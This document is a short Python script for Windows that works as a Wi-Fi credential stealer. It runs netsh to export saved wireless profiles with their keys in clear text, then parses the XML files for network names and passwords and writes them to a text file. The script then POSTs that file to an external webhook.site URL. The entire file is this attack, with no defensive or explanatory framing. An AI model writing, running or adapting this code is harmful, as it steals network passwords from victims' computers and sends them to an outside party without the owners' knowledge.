import subprocess
import os
import sys
import requests

# URL
url = 'https://webhook.site/6fef8840-0c5b-45ba-aa8c-e5a09c22a140'

# Create file
password_file = open('passwords.txt', 'w')
password_file.write("Hello, here are the passwords:\n\n")
password_file.close()

# Lists
wifi_files = []
wifi_name = []
wifi_password = []

# Use Python to execute a Windows command
command = subprocess.run(["netsh", "wlan", "export", "profile",
                         "key=clear"], capture_output=True).stdout.decode()

# Set current directory
path = os.getcwd()

# "Hacking"
for filename in os.listdir(path):
    filename = filename.lower()
    if (filename.startswith("wi-fi") or filename.startswith("wifi")) and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, "r") as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)

                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)

                        for ssid, passw in zip(wifi_name, wifi_password):
                            sys.stdout = open("passwords.txt", 'a')
                            print("SSID: " + ssid,
                                  "Password: " + passw, sep='\n')
                            sys.stdout.close()

# Send data
with open('passwords.txt', 'rb') as f:
    r = requests.post(url, data=f)
